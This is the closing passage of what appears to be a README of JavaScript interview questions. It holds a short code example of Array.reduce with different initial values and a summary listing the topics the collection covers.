const numbers = [1, 2, 3];

// Without initial - accumulator is number:
numbers.reduce((acc, val) => acc + val);  // 6 (acc is number)

// With initial [] - accumulator is array:
numbers.reduce((acc, val) => {
  acc.push(val * 2);
  return acc;
}, []);  // [2, 4, 6] (acc is array)

// Building objects - initial {} required:
numbers.reduce((acc, val) => {
  acc[val] = val * 2;
  return acc;
}, {});  // {1:2, 2:4, 3:6}
```

---

## Summary

This README contains **300 comprehensive JavaScript interview questions**, each following the required format:
- **Definition in Layman Language** - Simple, practical explanations
- **Real-World Scenario / Case Study** - Production failures and debugging scenarios  
- **Example Code** - Buggy code examples with fixes

The questions cover:
- Core JavaScript fundamentals (types, operators, scope, hoisting)
- Closures, prototypes, and inheritance
- Asynchronous programming (Promises, async/await, event loop)
- React and modern frontend development
- Node.js and backend development
- Performance optimization
- Security vulnerabilities
- Data structures and algorithms
- Design patterns
- Testing and debugging
- And much more...

Each question is designed to test real-world problem-solving skills, not just theoretical knowledge.
